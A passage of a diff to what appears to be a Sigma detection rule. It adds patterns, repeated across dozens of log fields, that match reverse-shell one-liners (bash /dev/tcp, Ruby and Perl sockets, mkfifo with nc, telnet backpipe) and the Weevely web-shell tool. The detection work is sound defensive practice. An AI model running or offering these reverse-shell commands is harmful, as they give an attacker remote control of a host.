+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - Details:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - registry.value:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - process.args:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - process.command_line:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - process.env_vars:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - process.io.text:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - process.title:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - pe.company:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - pe.description:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - pe.product:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - os.full:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - host.hostname:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - event.original:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - email.subject:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - device.model.name:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - container.image.name:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - container.name:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - url:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - dest_url:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - uri:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - uri_query:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - query:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - url_domain:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - uri_path:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - domain:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - QueryName:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - QueryResults:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - DestinationHostname:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - DestinationIp:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - http_referrer:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - http_referrer_domain:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - http_user_agent:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - dest_nt_host:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - sender:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - recipient:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - orig_recipient:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - subject:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - url.domain:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - url.full:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - url.original:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - url.query:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - user_agent.original:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - network.application:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - http.request.body.content:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - http.request.referrer:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - email.from.address:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - dns.question.name:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
+  - destination.domain:
+    - '*/weevely.py*'
+    - '*epinna/weevely3*'
   condition: selection
 fields:
 - Image
@@ -274,6 +1336,56 @@ fields:
 - container.image.name
 - container.name
 - object
+- ParentCommandLine
+- CommandLine
+- Details
+- registry.value
+- process.args
+- process.command_line
+- process.env_vars
+- process.io.text
+- process.title
+- pe.company
+- pe.description
+- pe.product
+- os.full
+- host.hostname
+- event.original
+- email.subject
+- device.model.name
+- container.image.name
+- container.name
+- url
+- dest_url
+- uri
+- uri_query
+- query
+- url_domain
+- uri_path
+- domain
+- QueryName
+- QueryResults
+- DestinationHostname
+- DestinationIp
+- http_referrer
+- http_referrer_domain
+- http_user_agent
+- dest_nt_host
+- sender
+- recipient
+- orig_recipient
+- subject
+- url.domain
+- url.full
+- url.original
+- url.query
+- user_agent.original
+- network.application
+- http.request.body.content
+- http.request.referrer
+- email.from.address
+- dns.question.name
+- destination.domain
 falsepositives:
 - unknown
 level: medium
